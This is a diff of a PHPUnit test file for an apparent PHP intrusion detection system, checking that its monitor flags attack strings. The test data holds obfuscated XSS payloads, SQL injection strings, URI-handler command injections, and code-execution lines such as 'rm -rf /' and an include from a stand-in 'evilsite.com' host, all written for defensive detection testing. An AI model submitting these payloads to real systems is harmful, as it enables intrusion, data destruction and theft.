@@ -151,6 +151,24 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
         $this->assertEquals(18, $result->getImpact());
     }
 
+    public function testAttributeBreakerList() {
+
+        $exploits = array();
+        $exploits[] = '" style ="';
+        $exploits[] = '"src=xxx a="';
+        $exploits[] = '"\' type=\'1';
+        $exploits[] = '" a "" b="x"';
+        
+        $test = new IDS_Monitor(
+            $exploits,
+            $this->storage
+        );
+        $result = $test->run();
+        $this->assertTrue($result->hasEvent(1));
+        
+        $this->assertEquals(20, $result->getImpact());        
+    }     
+    
     public function testCommentList() {
 
         $exploits = array();
@@ -168,7 +186,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
         $result = $test->run();
         $this->assertTrue($result->hasEvent(1));
         
-        $this->assertEquals(18, $result->getImpact());        
+        $this->assertEquals(15, $result->getImpact());        
     }    
 
     public function testConcatenatedXSSList() {
@@ -181,6 +199,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
         $exploits[] = "s1=['java'||''+'']; s2=['scri'||''+'']; s3=['pt'||''+''];";
         $exploits[] = "s1='java'||''+'';s2='scri'||''+'';s3='pt'||''+'';";
         $exploits[] = "s1=!''&&'jav';s2=!''&&'ascript';s3=!''&&':';s4=!''&&'aler';s5=!''&&'t';s6=!''&&'(1)';s7=s1+s2+s3+s4+s5+s6;URL=s7;";
+        $exploits[] = " t0 =1? \"val\":0;t1 =1? \"e\":0;t2 =1? \"nam\":0;t=1? t1+t0:0;t=1?t[1? t:0]:0;t=(1? t:0)(1? (1? t:0)(1? t2+t1:0):0);";
         
         $test = new IDS_Monitor(
             $exploits,
@@ -189,7 +208,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
         $result = $test->run();
         $this->assertTrue($result->hasEvent(1));
         
-        $this->assertEquals(85, $result->getImpact());        
+        $this->assertEquals(129, $result->getImpact());        
     }     
     
     public function testXSSList() {
@@ -210,63 +229,71 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
         $result = $test->run();
         $this->assertTrue($result->hasEvent(1));
         
-        $this->assertEquals(118, $result->getImpact());        
+        $this->assertEquals(115, $result->getImpact());        
     }
 
     public function testSelfContainedXSSList() {
-        $test = new IDS_Monitor(
-            array('a=0||\'ev\'+\'al\',b=0||1[a](\'loca\'+\'tion.hash\'),c=0||\'sub\'+\'str\',1[a](b[c](1));', 
-                  'eval.call(this,unescape.call(this,location))',
-                  'd=0||\'une\'+\'scape\'||0;a=0||\'ev\'+\'al\'||0;b=0||\'locatio\';b+=0||\'n\'||0;c=b[a];d=c(d);c(d(c(b)))',
-                  '_=eval,__=unescape,___=document.URL,_(__(___))', 
-                  '$=document,$=$.URL,$$=unescape,$$$=eval,$$$($$($))', 
-                  'y=<a>alert</a>;content[y](123)', 
-                  '$_=document,$__=$_.URL,$___=unescape,$_=$_.body,$_.innerHTML = $___(http=$__)', 
-                  'ev\al.call(this,unescape.call(this,location))', 
-                  'setTimeout//
-                    (name//
-                    ,0)//', 
-                  'a=/ev/ 
-                    .source
-                    a+=/al/ 
-                    .source,a = a[a]
-                    a(name)', 
-                  'a=eval,b=(name);a(b)', 
-                  'a=eval,b= [ referrer ] ;a(b)' 
-                  ),
+        
+        $exploits = array();
+        $exploits[] = 'a=0||\'ev\'+\'al\',b=0||1[a](\'loca\'+\'tion.hash\'),c=0||\'sub\'+\'str\',1[a](b[c](1));';
+        $exploits[] = 'eval.call(this,unescape.call(this,location))';
+        $exploits[] = 'd=0||\'une\'+\'scape\'||0;a=0||\'ev\'+\'al\'||0;b=0||\'locatio\';b+=0||\'n\'||0;c=b[a];d=c(d);c(d(c(b)))';
+        $exploits[] = '_=eval,__=unescape,___=document.URL,_(__(___))';
+        $exploits[] = '$=document,$=$.URL,$$=unescape,$$$=eval,$$$($$($))';
+        $exploits[] = 'y=<a>alert</a>;content[y](123)';
+        $exploits[] = '$_=document,$__=$_.URL,$___=unescape,$_=$_.body,$_.innerHTML = $___(http=$__)';
+        $exploits[] = 'ev\al.call(this,unescape.call(this,location))';
+        $exploits[] = 'setTimeout//
+                        (name//
+                        ,0)//';
+        $exploits[] = 'a=/ev/ 
+                        .source
+                        a+=/al/ 
+                        .source,a = a[a]
+                        a(name)';
+        $exploits[] = 'a=eval,b=(name);a(b)';
+        $exploits[] = 'a=eval,b= [ referrer ] ;a(b)';
+    	
+    	$test = new IDS_Monitor(
+            $exploits,
             $this->storage
         );
         $result = $test->run();
         $this->assertTrue($result->hasEvent(1));
-        $this->assertEquals(208, $result->getImpact());        
+        $this->assertEquals(249, $result->getImpact());        
     }
 
     public function testSQLIList() {
-        $test = new IDS_Monitor(
-            array('" OR 1=1#', 
-                  '; DROP table Users --', 
-                  '/**/S/**/E/**/L/**/E/**/C/**/T * FROM users WHERE 1 = 1',
-                  'admin\'--', 
-                  'SELECT /*!32302 1/0, */ 1 FROM tablename', 
-                  '10;DROP members --', 
-                  ' SELECT IF(1=1,\'true\',\'false\')', 
-                  'SELECT CHAR(0x66)', 
-                  'SELECT LOAD_FILE(0x633A5C626F6F742E696E69)', 
-                  'EXEC(@stored_proc @param)', 
-                  'chr(11)||chr(12)||char(13)', 
-                  'MERGE INTO bonuses B USING (SELECT', 
-                  '1 or name like \'%\'', 
-                  '1 OR \'1\'!=0', 
-                  '1 OR ASCII(2) = ASCII(2)',
-                  '1\' OR 1&"1', 
-                  '1\' OR \'1\' XOR \'0 ',
-                  '1 OR+1=1',
-                  '1 OR+(1)=(1) '),
+        
+    	$exploits = array();
+    	$exploits[] = '" OR 1=1#';
+    	$exploits[] = '; DROP table Users --';
+    	$exploits[] = '/**/S/**/E/**/L/**/E/**/C/**/T * FROM users WHERE 1 = 1';
+    	$exploits[] = 'admin\'--';
+    	$exploits[] = 'SELECT /*!32302 1/0, */ 1 FROM tablename';
+    	$exploits[] = '10;DROP members --';
+    	$exploits[] = ' SELECT IF(1=1,\'true\',\'false\')';
+    	$exploits[] = 'SELECT CHAR(0x66)';
+    	$exploits[] = 'SELECT LOAD_FILE(0x633A5C626F6F742E696E69)';
+    	$exploits[] = 'EXEC(@stored_proc @param)';
+    	$exploits[] = 'chr(11)||chr(12)||char(13)';
+    	$exploits[] = 'MERGE INTO bonuses B USING (SELECT';
+    	$exploits[] = '1 or name like \'%\'';
+    	$exploits[] = '1 OR \'1\'!=0';
+    	$exploits[] = '1 OR ASCII(2) = ASCII(2)';
+    	$exploits[] = '1\' OR 1&"1';
+    	$exploits[] = '1\' OR \'1\' XOR \'0 ';
+    	$exploits[] = '1 OR+1=1';
+    	$exploits[] = '1 OR+(1)=(1) ';
+    	$exploits[] = '1 OR \'1';
+    	
+    	$test = new IDS_Monitor(
+            $exploits,
             $this->storage
         );
         $result = $test->run();
         $this->assertTrue($result->hasEvent(1));
-        $this->assertEquals(194, $result->getImpact());        
+        $this->assertEquals(199, $result->getImpact());        
     }
     
     public function testDTList(){
@@ -277,8 +304,13 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
             $test1 = addslashes($test1);
             $test2 = addslashes($test2);
         }        
+        
+        $exploits = array();
+        $exploits[] = $test1;
+        $exploits[] = $test2;        
+        
         $test = new IDS_Monitor(
-            array($test1, $test2),
+            $exploits,
             $this->storage
         );
         $result = $test->run();
@@ -287,35 +319,37 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
     }
 
     public function testURIList(){
-        $test = new IDS_Monitor(
-            array('firefoxurl:test|"%20-new-window%20file:\c:/test.txt',
-                  'firefoxurl:test|"%20-new-window%20javascript:alert(\'Cross%2520Browser%2520Scripting!\');"',
-                  'aim: &c:\windows\system32\calc.exe" ini="C:\Documents and Settings\All Users\Start Menu\Programs\Startup\pwnd.bat"',
-                  'aim:///#1111111/11111111111111111111111111111111111111111111111111111111111112222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222226666666AAAABBBB6666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666',
-                  'navigatorurl:test" -chrome "javascript:C=Components.classes;I=Components.interfaces;file=C[\'@mozilla.org/file/local;1\'].createInstance(I.nsILocalFile);file.initWithPath(\'C:\'+String.fromCharCode(92)+String.fromCharCode(92)+\'Windows\'+String.fromCharCode(92)+String.fromCharCode(92)+\'System32\'+String.fromCharCode(92)+String.fromCharCode(92)+\'cmd.exe\');process=C[\'@mozilla.org/process/util;1\'].createInstance(I.nsIProcess);process.init(file);process.run(true%252c{}%252c0);alert(process)',  
-                  'res://c:\\program%20files\\adobe\\acrobat%207.0\\acrobat\\acrobat.dll/#2/#210', 
-                  'mailto:%00%00../../../../../../windows/system32/cmd".exe ../../../../../../../../windows/system32/calc.exe " - " blah.bat', 
-                  'nntp:%00%00../../../../../../windows/system32/cmd".exe ../../../../../../../../windows/system32/calc.exe " - " blah.bat', 
-                  'news:%00%00../../../../../../windows/system32/cmd".exe ../../../../../../../../windows/system32/calc.exe " - " blah.bat', 
-                  'snews:%00%00../../../../../../windows/system32/cmd".exe ../../../../../../../../windows/system32/calc.exe " - " blah.bat', 
-                  'telnet:%00%00../../../../../../windows/system32/cmd".exe ../../../../../../../../windows/system32/calc.exe " - " blah.bat'
-                  ),
+        
+    	$exploits = array();
+    	$exploits[] = 'firefoxurl:test|"%20-new-window%20file:\c:/test.txt';
+    	$exploits[] = 'firefoxurl:test|"%20-new-window%20javascript:alert(\'Cross%2520Browser%2520Scripting!\');"';
+    	$exploits[] = 'aim: &c:\windows\system32\calc.exe" ini="C:\Documents and Settings\All Users\Start Menu\Programs\Startup\pwnd.bat"';
+    	$exploits[] = 'aim:///#1111111/11111111111111111111111111111111111111111111111111111111111112222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222226666666AAAABBBB6666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666';
+    	$exploits[] = 'navigatorurl:test" -chrome "javascript:C=Components.classes;I=Components.interfaces;file=C[\'@mozilla.org/file/local;1\'].createInstance(I.nsILocalFile);file.initWithPath(\'C:\'+String.fromCharCode(92)+String.fromCharCode(92)+\'Windows\'+String.fromCharCode(92)+String.fromCharCode(92)+\'System32\'+String.fromCharCode(92)+String.fromCharCode(92)+\'cmd.exe\');process=C[\'@mozilla.org/process/util;1\'].createInstance(I.nsIProcess);process.init(file);process.run(true%252c{}%252c0);alert(process)';
+    	$exploits[] = 'res://c:\\program%20files\\adobe\\acrobat%207.0\\acrobat\\acrobat.dll/#2/#210';
+    	$exploits[] = 'mailto:%00%00../../../../../../windows/system32/cmd".exe ../../../../../../../../windows/system32/calc.exe " - " blah.bat';
+
+    	$test = new IDS_Monitor(
+            $exploits,
             $this->storage
         );
         $result = $test->run();
         $this->assertTrue($result->hasEvent(1));
-        $this->assertEquals(230, $result->getImpact());          
+        $this->assertEquals(117, $result->getImpact());          
     }    
     
     public function testRFEList() {
-        $test = new IDS_Monitor(
-            array(';phpinfo()', 
-                  '"; <?php exec("rm -rf /"); ?>',
-                  '; file_get_contents(\'/usr/local/apache2/conf/httpd.conf\');',
-                  ';echo file_get_contents(implode(DIRECTORY_SEPARATOR, array("usr","local","apache2","conf","httpd.conf"))', 
-                  '; include "http://evilsite.com/evilcode"', 
-                  '; rm -rf /\0'
-                  ),
+        
+    	$exploits = array();
+    	$exploits[] = ';phpinfo()';
+    	$exploits[] = '"; <?php exec("rm -rf /"); ?>';
+    	$exploits[] = '; file_get_contents(\'/usr/local/apache2/conf/httpd.conf\');';
+    	$exploits[] = ';echo file_get_contents(implode(DIRECTORY_SEPARATOR, array("usr","local","apache2","conf","httpd.conf"))';
+    	$exploits[] = '; include "http://evilsite.com/evilcode"';
+    	$exploits[] = '; rm -rf /\0';
+    	
+    	$test = new IDS_Monitor(
+            $exploits,
             $this->storage
         );
         $result = $test->run();
@@ -324,25 +358,36 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
     }
 
     public function testDecimalCCConverter() {
-        $test = new IDS_Monitor(
-            array('&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#32;&#108;&#97;&#110;&#103;&#117;&#97;&#103;&#101;&#61;&#34;&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#62;&#32;&#10;&#47;&#47;&#32;&#67;&#114;&#101;&#97;&#109;&#111;&#115;&#32;&#108;&#97;&#32;&#99;&#108;&#97;&#115;&#101;&#32;&#10;&#102;&#117;&#110;&#99;&#116;&#105;&#111;&#110;&#32;&#112;&#111;&#112;&#117;&#112;&#32;&#40;&#32;&#41;&#32;&#123;&#32;&#10;&#32;&#47;&#47;&#32;&#65;&#116;&#114;&#105;&#98;&#117;&#116;&#111;&#32;&#112;&#250;&#98;&#108;&#105;&#99;&#111;&#32;&#105;&#110;&#105;&#99;&#105;&#97;&#108;&#105;&#122;&#97;&#100;&#111;&#32;&#97;&#32;&#97;&#98;&#111;&#117;&#116;&#58;&#98;&#108;&#97;&#110;&#107;&#32;&#10;&#32;&#116;&#104;&#105;&#115;&#46;&#117;&#114;&#108;&#32;&#61;&#32;&#39;&#97;&#98;&#111;&#117;&#116;&#58;&#98;&#108;&#97;&#110;&#107;&#39;&#59;&#32;&#10;&#32;&#47;&#47;&#32;&#65;&#116;&#114;&#105;&#98;&#117;&#116;&#111;&#32;&#112;&#114;&#105;&#118;&#97;&#100;&#111;&#32;&#112;&#97;&#114;&#97;&#32;&#101;&#108;&#32;&#111;&#98;&#106;&#101;&#116;&#111;&#32;&#119;&#105;&#110;&#100;&#111;&#119;&#32;&#10;&#32;&#118;&#97;&#114;&#32;&#118;&#101;&#110;&#116;&#97;&#110;&#97;&#32;&#61;&#32;&#110;&#117;&#108;&#108;&#59;&#32;&#10;&#32;&#47;&#47;&#32;&#46;&#46;&#46;&#32;&#10;&#125;&#32;&#10;&#118;&#101;&#110;&#116;&#97;&#110;&#97;&#32;&#61;&#32;&#110;&#101;&#119;&#32;&#112;&#111;&#112;&#117;&#112;&#32;&#40;&#41;&#59;&#32;&#10;&#118;&#101;&#110;&#116;&#97;&#110;&#97;&#46;&#117;&#114;&#108;&#32;&#61;&#32;&#39;&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#119;&#119;&#119;&#46;&#112;&#114;&#111;&#103;&#114;&#97;&#109;&#97;&#99;&#105;&#111;&#110;&#119;&#101;&#98;&#46;&#110;&#101;&#116;&#47;&#39;&#59;&#32;&#10;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#32;&#10;&#32;', 
-                  '60,115,99,114,105,112,116,62,97,108,100+1,114,116,40,49,41,60,47,115,99,114,105,112,116,62'),
+        
+        $exploits = array();
+        $exploits[] = '&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#32;&#108;&#97;&#110;&#103;&#117;&#97;&#103;&#101;&#61;&#34;&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#62;&#32;&#10;&#47;&#47;&#32;&#67;&#114;&#101;&#97;&#109;&#111;&#115;&#32;&#108;&#97;&#32;&#99;&#108;&#97;&#115;&#101;&#32;&#10;&#102;&#117;&#110;&#99;&#116;&#105;&#111;&#110;&#32;&#112;&#111;&#112;&#117;&#112;&#32;&#40;&#32;&#41;&#32;&#123;&#32;&#10;&#32;&#47;&#47;&#32;&#65;&#116;&#114;&#105;&#98;&#117;&#116;&#111;&#32;&#112;&#250;&#98;&#108;&#105;&#99;&#111;&#32;&#105;&#110;&#105;&#99;&#105;&#97;&#108;&#105;&#122;&#97;&#100;&#111;&#32;&#97;&#32;&#97;&#98;&#111;&#117;&#116;&#58;&#98;&#108;&#97;&#110;&#107;&#32;&#10;&#32;&#116;&#104;&#105;&#115;&#46;&#117;&#114;&#108;&#32;&#61;&#32;&#39;&#97;&#98;&#111;&#117;&#116;&#58;&#98;&#108;&#97;&#110;&#107;&#39;&#59;&#32;&#10;&#32;&#47;&#47;&#32;&#65;&#116;&#114;&#105;&#98;&#117;&#116;&#111;&#32;&#112;&#114;&#105;&#118;&#97;&#100;&#111;&#32;&#112;&#97;&#114;&#97;&#32;&#101;&#108;&#32;&#111;&#98;&#106;&#101;&#116;&#111;&#32;&#119;&#105;&#110;&#100;&#111;&#119;&#32;&#10;&#32;&#118;&#97;&#114;&#32;&#118;&#101;&#110;&#116;&#97;&#110;&#97;&#32;&#61;&#32;&#110;&#117;&#108;&#108;&#59;&#32;&#10;&#32;&#47;&#47;&#32;&#46;&#46;&#46;&#32;&#10;&#125;&#32;&#10;&#118;&#101;&#110;&#116;&#97;&#110;&#97;&#32;&#61;&#32;&#110;&#101;&#119;&#32;&#112;&#111;&#112;&#117;&#112;&#32;&#40;&#41;&#59;&#32;&#10;&#118;&#101;&#110;&#116;&#97;&#110;&#97;&#46;&#117;&#114;&#108;&#32;&#61;&#32;&#39;&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#119;&#119;&#119;&#46;&#112;&#114;&#111;&#103;&#114;&#97;&#109;&#97;&#99;&#105;&#111;&#110;&#119;&#101;&#98;&#46;&#110;&#101;&#116;&#47;&#39;&#59;&#32;&#10;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#32;&#10;&#32;';
+        $exploits[] = '60,115,99,114,105,112,116,62,97,108,100+1,114,116,40,49,41,60,47,115,99,114,105,112,116,62';    	
+    	
+    	$test = new IDS_Monitor(
+            $exploits,
             $this->storage
         );
         $result = $test->run();
         $this->assertTrue($result->hasEvent(1));
-        $this->assertEquals(61, $result->getImpact());              
+        $this->assertEquals(59, $result->getImpact());              
     }
 
     public function testOctalCCConverter() {
-        $test1 = 'XXX';
+  	
+    	$test1 = 'XXX';
         $test2 = '\74\163\143\162\151\160\164\76\141\154\145\162\164\50\47\150\151\47\51\74\57\163\143\162\151\160\164\76';
+        
         if(get_magic_quotes_gpc()){
             $test1 = addslashes($test1);
             $test2 = addslashes($test2);
         }        
+
+        $exploits = array();
+        $exploits[] = $test1;
+        $exploits[] = $test2;          
+        
         $test = new IDS_Monitor(
-            array($test1, $test2),
+            $exploits,
             $this->storage
         );
         $result = $test->run();
@@ -353,16 +398,22 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
     public function testHexCCConverter() {
         $test1 = ';&#x6e;&#x67;&#x75;&#x61;&#x67;&#x65;&#x3d;&#x22;&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x22;&#x3e;&#x20;&#x0a;&#x2f;&#x2f;&#x20;&#x43;&#x72;&#x65;&#x61;&#x6d;&#x6f;&#x73;&#x20;&#x6c;&#x61;&#x20;&#x63;&#x6c;&#x61;&#x73;&#x65;&#x20;&#x0a;&#x66;&#x75;&#x6e;&#x63;&#x74;&#x69;&#x6f;&#x6e;&#x20;&#x70;&#x6f;&#x70;&#x75;&#x70;&#x20;&#x28;&#x20;&#x29;&#x20;&#x7b;&#x20;&#x0a;&#x20;&#x2f;&#x2f;&#x20;&#x41;&#x74;&#x72;&#x69;&#x62;&#x75;&#x74;&#x6f;&#x20;&#x70;&#xfa;&#x62;&#x6c;&#x69;&#x63;&#x6f;&#x20;&#x69;&#x6e;&#x69;&#x63;&#x69;&#x61;&#x6c;&#x69;&#x7a;&#x61;&#x64;&#x6f;&#x20;&#x61;&#x20;&#x61;&#x62;&#x6f;&#x75;&#x74;&#x3a;&#x62;&#x6c;&#x61;&#x6e;&#x6b;&#x20;&#x0a;&#x20;&#x74;&#x68;&#x69;&#x73;&#x2e;&#x75;&#x72;&#x6c;&#x20;&#x3d;&#x20;&#x27;&#x61;&#x62;&#x6f;&#x75;&#x74;&#x3a;&#x62;&#x6c;&#x61;&#x6e;&#x6b;&#x27;&#x3b;&#x20;&#x0a;&#x20;&#x2f;&#x2f;&#x20;&#x41;&#x74;&#x72;&#x69;&#x62;&#x75;&#x74;&#x6f;&#x20;&#x70;&#x72;&#x69;&#x76;&#x61;&#x64;&#x6f;&#x20;&#x70;&#x61;&#x72;&#x61;&#x20;&#x65;&#x6c;&#x20;&#x6f;&#x62;&#x6a;&#x65;&#x74;&#x6f;&#x20;&#x77;&#x69;&#x6e;&#x64;&#x6f;&#x77;&#x20;&#x0a;&#x20;&#x76;&#x61;&#x72;&#x20;&#x76;&#x65;&#x6e;&#x74;&#x61;&#x6e;&#x61;&#x20;&#x3d;&#x20;&#x6e;&#x75;&#x6c;&#x6c;&#x3b;&#x20;&#x0a;&#x20;&#x2f;&#x2f;&#x20;&#x2e;&#x2e;&#x2e;&#x20;&#x0a;&#x7d;&#x20;&#x0a;&#x76;&#x65;&#x6e;&#x74;&#x61;&#x6e;&#x61;&#x20;&#x3d;&#x20;&#x6e;&#x65;&#x77;&#x20;&#x70;&#x6f;&#x70;&#x75;&#x70;&#x20;&#x28;&#x29;&#x3b;&#x20;&#x0a;&#x76;&#x65;&#x6e;&#x74;&#x61;&#x6e;&#x61;&#x2e;&#x75;&#x72;&#x6c;&#x20;&#x3d;&#x20;&#x27;&#x68;&#x74;&#x74;&#x70;&#x3a;&#x2f;&#x2f;&#x77;&#x77;&#x77;&#x2e;&#x70;&#x72;&#x6f;&#x67;&#x72;&#x61;&#x6d;&#x61;&#x63;&#x69;&#x6f;&#x6e;&#x77;&#x65;&#x62;&#x2e;&#x6e;&#x65;&#x74;&#x2f;&#x27;&#x3b;&#x20;&#x0a;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x20;&#x0a;&#x20;';
         $test2 = '\x0000003c\x0000073\x0000063\x0000072\x0000069\x0000070\x0000074\x000003e\x0000061\x000006c\x0000065\x0000072\x0000074\x0000028\x0000032\x0000029\x000003c\x000002f\x0000073\x0000063\x0000072\x0000069\x0000070\x0000074\x000003e';
+        
         if(get_magic_quotes_gpc()){
             $test1 = addslashes($test1);
             $test2 = addslashes($test2);
         } 
+        
+        $exploits = array();
+        $exploits[] = $test1;
+        $exploits[] = $test2;          
+        
         $test = new IDS_Monitor(
-            array($test1, $test2),
+            $exploits,
             $this->storage
         );
         $result = $test->run();
         $this->assertTrue($result->hasEvent(1));
-        $this->assertEquals(64, $result->getImpact());              
+        $this->assertEquals(62, $result->getImpact());              
     }
 }
